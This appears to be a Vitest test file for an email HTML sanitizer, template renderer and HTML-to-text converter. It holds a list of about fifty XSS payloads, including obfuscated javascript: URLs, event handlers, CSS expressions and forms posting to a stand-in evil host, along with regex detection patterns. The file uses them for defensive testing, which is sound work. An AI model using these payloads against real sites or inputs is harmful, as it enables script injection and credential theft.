import { describe, it, expect } from "vitest";
import {
  sanitizeEmailHtml,
  sanitizeInlineCss,
  sanitizeStyleSheet,
  renderHtmlTemplate,
  escapeHtml,
  escapeHtmlValue,
  decodeHtmlEntities,
  htmlToText,
} from "./email-html.js";

/** Nothing that can run script or navigate on its own may survive. */
function expectInert(html: string) {
  const lower = html.toLowerCase();
  expect(lower).not.toMatch(/<script|<iframe|<object|<embed|<form|<input|<button|<base|<link|<svg|<math|<frame|<applet/);
  expect(lower).not.toMatch(/\son[a-z]+\s*=/);
  expect(lower).not.toMatch(/javascript:|vbscript:|livescript:/);
  expect(lower).not.toMatch(/expression\s*\(|-moz-binding|behavior\s*:/);
  expect(lower).not.toMatch(/http-equiv/);
  expect(lower).not.toMatch(/srcdoc|formaction|xlink:href/);
}

const XSS_PAYLOADS = [
  `<script>alert(1)</script>`,
  `<SCRIPT SRC=https://evil.example/x.js></SCRIPT>`,
  `<img src=x onerror=alert(1)>`,
  `<img src="javascript:alert(1)">`,
  `<img src="jav&#x09;ascript:alert(1)">`,
  `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
  `<img src="data:text/html,<script>alert(1)</script>">`,
  `<body onload=alert(1)>hi</body>`,
  `<a href="javascript:alert(1)">x</a>`,
  `<a href="JaVaScRiPt:alert(1)">x</a>`,
  `<a href=" &#14;  javascript:alert(1)">x</a>`,
  `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`,
  `<a href="vbscript:msgbox(1)">x</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
  `<a href="//evil.example/">x</a>`,
  `<iframe src="https://evil.example"></iframe>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="https://evil.example/x.swf"></object>`,
  `<embed src="https://evil.example/x.swf">`,
  `<form action="https://evil.example"><input name="password"><button formaction="javascript:alert(1)">go</button></form>`,
  `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
  `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
  `<base href="https://evil.example/">`,
  `<link rel="stylesheet" href="https://evil.example/x.css">`,
  `<svg onload=alert(1)><script>alert(1)</script></svg>`,
  `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  `<div style="width: expression(alert(1))">x</div>`,
  `<div style="background:url(javascript:alert(1))">x</div>`,
  `<div style="background:url('jav\\61script:alert(1)')">x</div>`,
  `<div style="behavior: url(x.htc)">x</div>`,
  `<div style="-moz-binding: url(https://evil.example/x.xml#x)">x</div>`,
  `<div style="width: exp/**/ression(alert(1))">x</div>`,
  `<style>body { background: url(javascript:alert(1)) }</style>`,
  `<style>@import url(https://evil.example/x.css);</style>`,
  `<style>div { width: expression(alert(1)) }</style>`,
  `<style>div{color:red}</style><script>alert(1)</script>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
  `<textarea><img src=x onerror=alert(1)></textarea>`,
  `<p><select><option><img src=x onerror=alert(1)></option></select></p>`,
  `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
  `<!--<img src=x onerror=alert(1)>-->`,
  `<!--[if mso]><script>alert(1)</script><![endif]-->`,
  `<img src="x" onerror="alert(1)" alt="ok">`,
  `<a href="https://ok.example" onclick="alert(1)" onmouseover="alert(1)">ok</a>`,
  `<video><source onerror="alert(1)"></video>`,
  `<details open ontoggle=alert(1)>`,
  `<marquee onstart=alert(1)>x</marquee>`,
  `<isindex action="javascript:alert(1)" type=image>`,
  `<xmp><img src=x onerror=alert(1)></xmp>`,
];

describe("sanitizeEmailHtml — XSS payloads", () => {
  for (const payload of XSS_PAYLOADS) {
    it(`neutralizes ${payload.slice(0, 70)}`, () => {
      const out = sanitizeEmailHtml(payload);
      expectInert(out);
      // Sanitizing is stable: a second pass does not change the result.
      expect(sanitizeEmailHtml(out)).toBe(out);
    });
  }

  it("does not let text smuggle markup in (it stays escaped)", () => {
    expect(sanitizeEmailHtml("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")).toBe(
      "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>",
    );
  });
});

describe("sanitizeEmailHtml — email design survives", () => {
  const design = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Spring update</title>
<style type="text/css">@media only screen and (max-width: 620px) { .container { width: 100% !important; } }</style>
</head>
<body style="margin:0; padding:0; background-color:#f4f4f5;">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f5">
<tr><td align="center" valign="top">
<table class="container" role="presentation" width="600" style="max-width:600px; background:#ffffff; font-family: 'Segoe UI', Arial, sans-serif;">
<tr><td style="padding:24px; background-image: url('https://cdn.example.com/bg.png');">
<img src="https://cdn.example.com/logo.png" alt="Logo" width="120" style="display:block; border:0;">
<h1 style="color:#0f172a; font-size:24px;">Hi {{first_name|there}},</h1>
<p>We help <strong>{{company}}</strong> grow.</p>
<a href="{{my_website}}" target="_blank" style="background:#2563eb; color:#fff; padding:12px 20px; border-radius:6px; text-decoration:none;">Book a call</a>
<p><a href="mailto:{{my_email}}">Email me</a> · <a href="tel:+15550100">Call</a></p>
<img src="cid:banner@mailnex" alt="Banner">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">
</td></tr></table>
</td></tr></table>
</body>
</html>`;

  const out = sanitizeEmailHtml(design);

  it("keeps the document structure, doctype, meta charset/viewport and title", () => {
    expect(out.startsWith("<!DOCTYPE html>\n<html lang=\"en\">")).toBe(true);
    expect(out).toContain('<meta charset="utf-8" />');
    expect(out).toContain('<meta name="viewport" content="width=device-width, initial-scale=1" />');
    expect(out).toContain("<title>Spring update</title>");
  });

  it("keeps a safe <style> block with media queries", () => {
    expect(out).toContain('<style type="text/css">@media only screen and (max-width: 620px) { .container { width: 100% !important; } }</style>');
  });

  it("keeps tables, layout attributes, classes and inline styles", () => {
    expect(out).toContain('<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f5">');
    expect(out).toContain('class="container"');
    expect(out).toMatch(/style="max-width:\s?600px;\s?background:\s?#ffffff;\s?font-family:\s?'Segoe UI', Arial, sans-serif;?"/);
    expect(out).toContain("background-image");
  });

  it("keeps placeholders, https/cid/inline-png images and http/mailto/tel links", () => {
    expect(out).toContain("Hi {{first_name|there}},");
    expect(out).toContain('href="{{my_website}}"');
    expect(out).toContain('href="mailto:{{my_email}}"');
    expect(out).toContain('href="tel:+15550100"');
    expect(out).toContain('src="https://cdn.example.com/logo.png"');
    expect(out).toContain('src="cid:banner@mailnex"');
    expect(out).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("is idempotent", () => {
    expect(sanitizeEmailHtml(out)).toBe(out);
  });

  it("returns a fragment unchanged as a fragment (no doctype added)", () => {
    expect(sanitizeEmailHtml("<p>Hello <b>there</b></p>")).toBe("<p>Hello <b>there</b></p>");
  });

  it("drops a plain http image but keeps http links", () => {
    expect(sanitizeEmailHtml('<img src="http://x.example/a.png" alt="a">')).toBe('<img alt="a" />');
    expect(sanitizeEmailHtml('<a href="http://x.example">x</a>')).toBe('<a href="http://x.example">x</a>');
  });
});

describe("sanitizeInlineCss", () => {
  it("keeps ordinary declarations, including data: URLs containing ';'", () => {
    expect(sanitizeInlineCss("color: red; padding: 4px 8px")).toBe("color: red; padding: 4px 8px");
    expect(sanitizeInlineCss("background: url(data:image/png;base64,AAAA) no-repeat")).toBe(
      "background: url(data:image/png;base64,AAAA) no-repeat",
    );
    expect(sanitizeInlineCss("mso-line-height-rule: exactly")).toBe("mso-line-height-rule: exactly");
  });

  it("drops only the unsafe declarations", () => {
    expect(sanitizeInlineCss("color: red; width: expression(alert(1)); margin: 0")).toBe("color: red; margin: 0");
    expect(sanitizeInlineCss("background: url(http://x.example/a.png); color: blue")).toBe("color: blue");
    expect(sanitizeInlineCss("behavior: url(x.htc)")).toBe("");
    expect(sanitizeInlineCss("color: re\\64")).toBe("");
    expect(sanitizeInlineCss("font-family: '</style><script>'")).toBe("");
  });

  it("removes comments before checking", () => {
    expect(sanitizeInlineCss("width: exp/**/ression(alert(1))")).toBe("");
    expect(sanitizeInlineCss("color: /* hi */ red")).toBe("color: red");
  });
});

describe("sanitizeStyleSheet", () => {
  it("keeps a clean sheet without its comments", () => {
    expect(sanitizeStyleSheet("/* c */ p > a { color: #2563eb; }")).toBe("p > a { color: #2563eb; }");
  });

  it("drops the whole sheet when any part is unsafe", () => {
    expect(sanitizeStyleSheet("p{color:red} @import url(https://x.example/a.css);")).toBe("");
    expect(sanitizeStyleSheet("p{background:url(javascript:alert(1))}")).toBe("");
    expect(sanitizeStyleSheet("p{color:red} /* unterminated")).toBe("p{color:red}");
  });
});

describe("renderHtmlTemplate", () => {
  it("HTML-escapes variable values so they cannot add markup", () => {
    const out = renderHtmlTemplate("<p>Hi {{first_name}} at {{company}}</p>", {
      first_name: "<b>Bob</b>",
      company: `"Acme" & <script>alert(1)</script>`,
    });
    expect(out).toBe("<p>Hi &lt;b&gt;Bob&lt;/b&gt; at \"Acme\" &amp; &lt;script&gt;alert(1)&lt;/script&gt;</p>");
  });

  it("cannot break out of an attribute", () => {
    const out = renderHtmlTemplate('<a href="https://x.example/?q={{company}}" title="{{company}}">x</a>', {
      company: `" onmouseover="alert(1)`,
    });
    // The quote stays encoded inside the attribute value; no new attribute appears.
    expect(out).toBe(
      '<a href="https://x.example/?q=&quot; onmouseover=&quot;alert(1)" title="&quot; onmouseover=&quot;alert(1)">x</a>',
    );
  });

  it("checks URLs that only exist once the variables are filled in", () => {
    const out = renderHtmlTemplate('<a href="{{contact_website}}">site</a>', { contact_website: "javascript:alert(1)" });
    expect(out).toBe("<a>site</a>");
    const ok = renderHtmlTemplate('<a href="{{my_website}}">site</a>', { my_website: "https://me.example/?a=1&b=2" });
    expect(ok).toBe('<a href="https://me.example/?a=1&amp;b=2">site</a>');
  });

  it("keeps multi-line values (the signature) as line breaks and honours fallbacks", () => {
    const out = renderHtmlTemplate("<p>Hi {{first_name|there}},</p><p>{{signature}}</p>", {
      first_name: "",
      signature: "Best regards,\nPriya",
    });
    expect(out).toBe("<p>Hi there,</p><p>Best regards,<br />Priya</p>");
  });
});

describe("escaping helpers", () => {
  it("escapeHtml escapes the five special characters", () => {
    expect(escapeHtml(`<a href="x">'&'</a>`)).toBe("&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#39;&lt;/a&gt;");
  });

  it("escapeHtmlValue turns line breaks into <br>", () => {
    expect(escapeHtmlValue("a\r\nb\nc")).toBe("a<br>b<br>c");
  });

  it("decodeHtmlEntities handles named and numeric entities", () => {
    expect(decodeHtmlEntities("&amp; &lt; &gt; &quot; &#39; &#x2014; &nbsp;&copy; &unknown;")).toBe(
      "& < > \" ' —  © &unknown;",
    );
  });
});

describe("htmlToText", () => {
  it("turns blocks into lines and keeps link targets", () => {
    const html = sanitizeEmailHtml(`<!DOCTYPE html><html><head><title>T</title><style>p{color:red}</style></head>
      <body><h1>Hello   Maya</h1><p>We help <b>Acme</b> &amp; friends.<br>Second line</p>
      <ul><li>One</li><li>Two</li></ul>
      <p><a href="https://x.example/book?a=1&amp;b=2">Book a call</a> or <a href="mailto:me@x.example">me@x.example</a></p>
      <table><tr><td>Left</td><td>Right</td></tr></table></body></html>`);
    expect(htmlToText(html)).toBe(
      [
        "Hello Maya",
        "",
        "We help Acme & friends.",
        "Second line",
        "",
        "- One",
        "- Two",
        "",
        "Book a call (https://x.example/book?a=1&b=2) or me@x.example",
        "",
        "Left Right",
      ].join("\n"),
    );
  });

  it("never contains tags, styles or the title", () => {
    const text = htmlToText("<html><head><title>Subject</title></head><body><div style='color:red'>Hi</div></body></html>");
    expect(text).toBe("Hi");
  });
});
